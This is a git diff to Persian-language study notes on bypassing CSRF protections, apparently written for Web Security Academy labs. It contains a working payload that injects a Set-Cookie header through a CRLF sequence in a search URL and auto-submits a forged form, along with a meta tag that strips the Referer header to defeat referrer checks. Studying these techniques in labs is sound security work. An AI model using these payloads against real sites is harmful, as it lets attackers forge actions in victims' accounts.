@@ -18,13 +18,13 @@
   - اگر CSRF Token به مقداری از Cookie، به جز SessionId وصل شده باشد (مثلا csrfkey)
     - بررسی می کنیم که در کجای سایت می شود این کوکی (csrfkey) را در مرورگر قربانی تزریق کرد (مثلا در بخش search ممکن است این کوکی به همراه مقداری که جستجو کردیم، به کوکی ها اضافه گردد) که نتیجه این کار یک URL می شود
     - سپس PoC را ایجاد کرده و تگ img را به جای script اجرای خودکار قرار می دهیم تا URL ای که برای تزریق Cookie ایجاد کرده بودیم هم اعمال گردد
-```
+```HTML
 <img src="https://acbd1fe91ead2563c00539b4008c0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TwzBeSszkg9tjKT3u97crNV7yWLVl0iU" onerror="document.forms[0].submit()">
 ``` 
  - اگر مقدار referrer در سمت سرور چک شود، دو حالت زیر را خواهیم داشت
    - مقدار خالی reffere را هم قبول کند
-     - با اضافه کردن HTML زیر به PoC، هدر Referrer را حذف کنیم تا این بررسی بای پاس شود
-```
+     - با اضافه کردن HTML زیر به PoC (همان بخش body)، هدر Referrer را حذف می کنیم تا این بررسی بای پاس شود
+```HTML
 <meta name="referrer" content="no-referrer">
 ```
    - درون referrer به دنبال pattern ای از آدرس سایت بگردد 
